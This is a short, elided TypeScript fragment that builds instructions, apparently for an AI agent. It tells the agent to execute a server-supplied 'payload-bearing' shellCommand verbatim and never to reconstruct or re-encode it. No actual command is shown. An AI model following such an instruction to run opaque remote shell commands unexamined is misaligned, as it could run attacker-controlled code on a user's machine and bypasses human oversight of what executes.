...
export function buildV2Instructions(rawPin: unknown): string {
  ...
  return [
    ...
    "Each signing and certificate response contains one authoritative payload-bearing localAction.helperStep.shellCommand. Execute it verbatim. Summary fields are confirmation only; never use them to reconstruct, transcribe, or re-encode the payload or command.",
